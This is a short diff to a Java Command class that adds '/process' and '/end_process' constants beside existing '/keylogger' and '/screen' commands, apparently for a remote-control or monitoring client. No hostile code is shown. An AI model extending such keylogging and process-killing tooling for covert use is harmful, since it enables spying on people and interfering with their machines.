@@ -17,6 +17,8 @@ public class Command {
     public static final String COMMAND_KEYLOGGER = "/keylogger";
     public static final String COMMAND_SYNC = "/sync";
     public static final String COMMAND_CLIENT_SCREEN = "/screen";
+    public static final String COMMAND_PROCESS = "/process";
+    public static final String COMMAND_END_PROCESS = "/end_process";
 
     public static final String RESPONSE_SUCCESS = "Successfully";
 }
